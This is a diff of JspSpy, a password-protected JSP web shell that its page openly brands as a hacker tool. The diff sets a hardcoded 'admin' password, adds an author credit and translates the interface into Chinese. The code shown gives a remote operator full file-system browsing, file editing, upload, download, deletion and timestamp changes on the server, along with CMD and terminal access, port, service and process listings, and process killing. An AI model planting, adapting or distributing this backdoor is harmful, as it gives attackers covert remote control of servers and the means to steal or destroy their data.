@@ -1,8 +1,8 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
 <!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->
-<HTML><HEAD><TITLE>※Jspspy web~shell V1.0</TITLE>
+<HTML><HEAD><TITLE>※Jspspy web~shell V1.0 ※MADE by 孤水绕城 QQ:540410588※</TITLE>
 <META http-equiv=Content-Type content="text/html; charset=gb2312">
-<META content="spy web~shell" name=GENERATOR></HEAD>
+<META content="孤水绕城Jspy web~shell" name=GENERATOR></HEAD>
 <%@ page contentType="text/html; charset=GBK" %>
 <%@ page import="java.io.*"%>
 <%@ page import="java.util.Map"%>
@@ -18,7 +18,7 @@
 <%@ page import="java.util.Date"%>
 <%@ page import="java.text.*"%>
 <%
-	final String passWord="hk"; //定义密码
+	final String passWord="admin"; //定义密码
 	final String nowURI=request.getRequestURI();
 	final String webSite_Folder = convertPath(application.getRealPath("/"));
 	final String AbsPath=application.getRealPath(request.getRequestURI());
@@ -31,7 +31,7 @@
 			response.sendRedirect(nowURI);
 		}
 		else{
-			out.print("<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><span style='color:#ffffff'>JspSpy V1.0 <br><br><a href='http://www.nohack.cn' style=\"color:white;\" target='_blank'>※Special Edition of Hacker Handbook※</a></span><form method='post'><span style='color:#ffffff'>PassWord：</span><input name='pass' type='password' size='22'> <input type='submit' value='Login'><br><br><br><font color=#3399FF></font><br></div><body>");
+			out.print("<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><span style='color:#ffffff'>JspSpy V1.0 <br><br><a href='http://www.nohack.cn' style=\"color:white;\" target='_blank'>※黑客手册专版※</a></span><form method='post'><span style='color:#ffffff'>输入密码：</span><input name='pass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><font color=#3399FF></font><br></div><body>");
 		}
 		return;
 	}
@@ -170,11 +170,11 @@ public void mainForm(JspWriter out,String webSite_Folder) throws Exception{
     out.print("<tr><td height=30 colspan=2>");
     out.print("<table width=100% height=25 border=0>");
     out.print("<form name=address method=post target=FileFrame onSubmit='checkUrl();'>");
-    out.print("<tr><td width=60 align=center>Path:</td><td>");
+    out.print("<tr><td width=60 align=center>FilePath:</td><td>");
     out.print("<input name=FolderPath type=text style=\"width:100%\" value='"+webSite_Folder+"'>");
     out.print("<input type=hidden name=action value=S>");
     out.print("<input type=hidden name=Filename><input type=hidden name = sFileName>");
-    out.print("</td><td width=100 align=center><a href=\"javascript:checkUrl();\">GO</a>"); 
+    out.print("</td><td width=100 align=center><a href=\"javascript:checkUrl();\">GOtoLink</a>"); 
     out.print("</td></tr></form></table></td></tr><tr><td width=148>");
     out.print("<iframe name=Menu src='?action=M' width=100% height=100% frameborder=2 scrolling=yes></iframe></td>");
     out.print("<td width=600>");
@@ -186,23 +186,23 @@ public void mainMenu(JspWriter out,String webSite_Folder,String strAbsPath) thro
 	out.print("<div align=\"center\" style=\"width: 100%; height:31; vertical-align:middle ;color: White ; position: relative; filter: glow(color=#00CCFF, strength=5)\"><font face=\"楷体_GB2312\" size=4>☆黑客手册专版☆</font> </div> ");
 	out.print("????????????┅?");	
 	listRoot(out);
-	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+webSite_Folder+"\");'><B>Root</B></A></TD></TR>\n");
-	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+convertPath(strAbsPath)+"\");'><B>Root Folder</B></A></TD></TR>\n");
-	out.print("<TD height=20><A href='javascript:newFolder(\""+webSite_Folder+"\")'> New directory </A></TD></TR><TR>\n");
-	out.print("<TR><TD height=20><A href=\"?action=G\" target=FileFrame>〖New File〗</A></TD></TR>\n");
-	out.print("<TR><TD height=20><A href=\"?action=q\" target=FileFrame>●Find<B>文件</B></A></TD></TR>");
-	out.print("<TR><TD height=20><A href='?action=t' target=FileFrame>●Upload<B>文件</TD></TR>");
-	out.print("<TR><TD onmouseover=\"menu2.style.display=''\" height=22><B>+≤Tools≥</B>\n");
+	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+webSite_Folder+"\");'><B>〖站点根目录〗</B></A></TD></TR>\n");
+	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+convertPath(strAbsPath)+"\");'><B>〖本程序目录〗</B></A></TD></TR>\n");
+	out.print("<TD height=20><A href='javascript:newFolder(\""+webSite_Folder+"\")'>〖新建目录〗</A></TD></TR><TR>\n");
+	out.print("<TR><TD height=20><A href=\"?action=G\" target=FileFrame>〖新建文本〗</A></TD></TR>\n");
+	out.print("<TR><TD height=20><A href=\"?action=q\" target=FileFrame>●查找<B>文件</B></A></TD></TR>");
+	out.print("<TR><TD height=20><A href='?action=t' target=FileFrame>●上传<B>文件</TD></TR>");
+	out.print("<TR><TD onmouseover=\"menu2.style.display=''\" height=22><B>+≤服务器端工具≥</B>\n");
 	out.print("<div id=menu2 style=\"display:none; width:100%\" onmouseout=\"menu2.style.dispaly='none'\">");
-	out.print("<a href='?action=U' target=FileFrame>〖System 〗</a><br>\n");
-	out.print("<a href='?action=E' target=FileFrame>〖CMD〗</a><br>\n");
-	out.print("<a href='?action=w' target=FileFrame>〖Terminal〗</a><br>\n");
-	out.print("<a href='?action=B&command=netstat' target=FileFrame>〖Port List〗</a><br>\n");
-	out.print("<a href='?action=Z&command=netstart' target=FileFrame>〖Service List〗</a><br>\n");
-	out.print("<a href='?action=Y&command=tasklist' target=FileFrame>〖Process list〗</a><br>\n");
-	out.print("<a href='?action=V' target=FileFrame>〖Kill Process〗</a><br>\n");
-	out.print("<a href='?action=x' target=FileFrame>〖Registry〗</a><br>\n");
-	out.print("<a href='?action=A' target=FileFrame>〖jspy〗</a><br>\n");
+	out.print("<a href='?action=U' target=FileFrame>〖系统参数〗</a><br>\n");
+	out.print("<a href='?action=E' target=FileFrame>〖CMD命令〗</a><br>\n");
+	out.print("<a href='?action=w' target=FileFrame>〖终端工具〗</a><br>\n");
+	out.print("<a href='?action=B&command=netstat' target=FileFrame>〖端口列表〗</a><br>\n");
+	out.print("<a href='?action=Z&command=netstart' target=FileFrame>〖服务列表〗</a><br>\n");
+	out.print("<a href='?action=Y&command=tasklist' target=FileFrame>〖进程列表〗</a><br>\n");
+	out.print("<a href='?action=V' target=FileFrame>〖结束进程〗</a><br>\n");
+	out.print("<a href='?action=x' target=FileFrame>〖注册表操作〗</a><br>\n");
+	out.print("<a href='?action=A' target=FileFrame>〖jspy说明〗</a><br>\n");
 	out.print("</div>");
 }
 void listRoot(JspWriter out){
@@ -214,7 +214,7 @@ void listRoot(JspWriter out){
 		out.print("<DIV id=\"menu1\" style=\"DISPLAY:none; onMouseout=menu1.style.display='none'\">\n");
 		File[] roots=File.listRoots();
 		for(int i=0;i<roots.length;i++){
-			out.print("<A href='"+"javascript:JshowFolder(\""+convertPath(roots[i].getPath())+"\")'>Local Disk："+roots[i].getPath()+"</A><br>\n");
+			out.print("<A href='"+"javascript:JshowFolder(\""+convertPath(roots[i].getPath())+"\")'>本地磁盘："+roots[i].getPath()+"</A><br>\n");
 				
 		}
 		out.print("</DIV></TD></TR>");
@@ -265,16 +265,16 @@ public void listFolder(JspWriter out,String path) throws Exception{
 			//输出目录部分
 			//out.print("<Tbody>\n");
 			//out.print("");
-			out.print("<tr><td align='left'>File Name</td><td align='center'>Type</td><td align='center'>Size</td><td align='center'>Readable</td><td align='center'>Write</td><td align='center'>Hide</td><td align='center'>Last Modified</td><td align='left'>Related operations</td></tr>");
+			out.print("<tr><td align='left'>文件名称</td><td align='center'>类型</td><td align='center'>大小</td><td align='center'>可读</td><td align='center'>可写</td><td align='center'>隐藏</td><td align='center'>最后修改时间</td><td align='left'>相关操作</td></tr>");
 			for(int i=0;abFileName[i]!=null;i++){	
-				out.print("<tr><td><a href='javascript:JshowFolder(\""+abFileName[i]+"\");'>"+"<font face=\"wingdings\" size=6>&#48;</font>"+strCut(reFileName[i],30)+"</td><td>folder</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>Move&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>Delete&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>Edit-Time&nbsp;&nbsp;</a><a href='javascript:zipFile(\""+abFileName[i]+"\");'>Zip&nbsp;&nbsp;</a></td></tr>");
+				out.print("<tr><td><a href='javascript:JshowFolder(\""+abFileName[i]+"\");'>"+"<font face=\"wingdings\" size=6>&#48;</font>"+strCut(reFileName[i],30)+"</td><td>folder</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>编辑属性&nbsp;&nbsp;</a><a href='javascript:zipFile(\""+abFileName[i]+"\");'>打包&nbsp;&nbsp;</a></td></tr>");
 			
 			}
 			//输出文件部分
 			out.print("</tr>");
 			
 			for(int i=sfiles.length;reFileName[i]!=null;i--){
-				out.print("<tr><td><a href='javascript:JshowFile(\""+reFileName[i]+"\")'>"+"<font face=\"wingdings\" size=5>&#50;</font>"+strCut(reFileName[i],30)+"</td><td>file</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>Move&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>Delete&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>Edit-Time&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>Copy&nbsp;&nbsp;</a><a href='?action=H&fileName="+abFileName[i]+"'>Edit&nbsp;&nbsp;</a><a href='javascript:downFIle(\""+abFileName[i]+"\");'>Download&nbsp;&nbsp;</a></td></tr>");
+				out.print("<tr><td><a href='javascript:JshowFile(\""+reFileName[i]+"\")'>"+"<font face=\"wingdings\" size=5>&#50;</font>"+strCut(reFileName[i],30)+"</td><td>file</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>编辑属性&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>复制&nbsp;&nbsp;</a><a href='?action=H&fileName="+abFileName[i]+"'>编辑&nbsp;&nbsp;</a><a href='javascript:downFIle(\""+abFileName[i]+"\");'>下载&nbsp;&nbsp;</a></td></tr>");
 			}
 			out.print("</table>");
 		}
@@ -527,7 +527,7 @@ public void reName(JspWriter out,String sPath,String dpath) throws Exception{
 		}
 		else{
 			if(sfile.renameTo(dfile)){
-				out.print("☆孤水绕城☆友情提示:<br><br>Move成功！");
+				out.print("☆孤水绕城☆友情提示:<br><br>移动成功！");
 			}
 		}
 	}
@@ -537,7 +537,7 @@ public void delName(JspWriter out,String spath) throws Exception{
 	if(empchk(spath)){
 		File file = new File(spath);
 		if(file.delete()){
-			out.print("☆孤水绕城☆友情提示:<br><br>Delete成功！");
+			out.print("☆孤水绕城☆友情提示:<br><br>删除成功！");
 		}
 	}
 }
@@ -558,7 +558,7 @@ public void copyName(JspWriter out,String spath,String dpath) throws Exception{
 				    while((nRet=fis.read(tempByte,0,1024))!=-1){
 					fos.write(tempByte,0,nRet);
 				}
-			out.print("☆孤水绕城☆友情提示:<br><br>文件Copy成功！");
+			out.print("☆孤水绕城☆友情提示:<br><br>文件复制成功！");
 		}catch(Exception e){
 		
 		}
@@ -680,7 +680,7 @@ public void  findFile(JspWriter out,String path,String filename)throws Exception
 				else if(list[i].isFile()){
 					if(list[i].getName().equals(dfileName)){
 						out.print("<table width='100%' border=0> ");
-						out.print("<tr><td width='60%'>"+strCut(convertPath(list[i].getPath()),70)+"</td><td width='40%'><a href='javascript:JsReName(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>Move&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>Copy&nbsp;&nbsp;</a><a href='?action=H&fileName="+convertPath(list[i].getPath())+"'>Edit&nbsp;&nbsp;</a><a <a href='?action=O&fileName="+convertPath(list[i].getPath())+"'>Download&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+convertPath(list[i].getPath())+"\");'>Delete&nbsp;&nbsp;</a><a href='javascript:setDate(\""+convertPath(list[i].getPath())+"\")'>Edit-Time&nbsp;&nbsp;</a></td></tr>");
+						out.print("<tr><td width='60%'>"+strCut(convertPath(list[i].getPath()),70)+"</td><td width='40%'><a href='javascript:JsReName(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>复制&nbsp;&nbsp;</a><a href='?action=H&fileName="+convertPath(list[i].getPath())+"'>编辑&nbsp;&nbsp;</a><a <a href='?action=O&fileName="+convertPath(list[i].getPath())+"'>下载&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+convertPath(list[i].getPath())+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+convertPath(list[i].getPath())+"\")'>编辑属性&nbsp;&nbsp;</a></td></tr>");
 						out.print("</table>");
 					}
 			
@@ -897,7 +897,7 @@ public void killProc(JspWriter out,String Pid) throws Exception{
 }
 //注册表操作函数，暂时不提供，期待下一个V1.1版本吧:-) 
 public void pregedit(JspWriter out) throws Exception{
-	out.print("<p>☆孤水绕城☆友情提示:<br><br>v1.0版本暂不支持注册表Edit功能，期待下一个V1.1版本吧:-) </p>");
+	out.print("<p>☆孤水绕城☆友情提示:<br><br>v1.0版本暂不支持注册表编辑功能，期待下一个V1.1版本吧:-) </p>");
 }
 public void aboutJspy(JspWriter out) throws Exception{
 	out.print("&nbsp;&nbsp;&nbsp;&nbsp;很久以前我有一个梦想，希望能像戏子一样灵思舞动衣袖飘飞，可是当再次面对繁华落尽的刹那我才发现其实人生如梦是句P话，梦醒后的人生依旧荒芜。无助的我就像一个犯了错的孩子，在爱与痛的边缘一直的堕落。在无尽的等待中期待伤口的愈合以及灵魂的萌芽。我想许久许久以后当尘埃落定的瞬间我希望你能看到我的苍老。wait for jhy......");
@@ -989,8 +989,8 @@ function newFolder(Rpath){
 		return;
 }
 function JsReName(spath,dpath){
-	var newFolderName = prompt("请输入Move到目标文件全名称",dpath);
-	if(confirm("你确定要Move到目标文件吗!")){
+	var newFolderName = prompt("请输入移动到目标文件全名称",dpath);
+	if(confirm("你确定要移动到目标文件吗!")){
 		top.document.address.action.value="I";
 		top.document.address.FolderPath.value=newFolderName;
 		top.document.address.sFileName.value=spath;
@@ -1001,8 +1001,8 @@ function JsReName(spath,dpath){
 	}
 }
 function JsCoypFile(spath,dpath){
-	var newFolderName = prompt("请输入Copy到目标文件全名称",dpath);
-	if(confirm("你确定要Copy到目标文件吗!")){
+	var newFolderName = prompt("请输入复制到目标文件全名称",dpath);
+	if(confirm("你确定要复制到目标文件吗!")){
 		top.document.address.action.value="K";
 		top.document.address.FolderPath.value=newFolderName;
 		top.document.address.sFileName.value=spath;
@@ -1013,7 +1013,7 @@ function JsCoypFile(spath,dpath){
 	}
 }
 function JsdelName(path){
-	if(confirm("你确定要Delete目标文件吗!")){
+	if(confirm("你确定要删除目标文件吗!")){
 		top.document.address.action.value="J";
 		top.document.address.Filename.value=path;
 		top.document.address.submit();
@@ -1026,7 +1026,7 @@ function downFIle(path){
 }
 function zipFile(spath){
 	var dfile = prompt("请输入目的地址","c:/windows/temp/down.zip");
-	if(confirm("你确定要Download到目的地址吗!")){
+	if(confirm("你确定要下载到目的地址吗!")){
 		top.document.address.action.value="P";
 		top.document.address.FolderPath.value=spath;
 		top.document.address.sFileName.value=dfile;
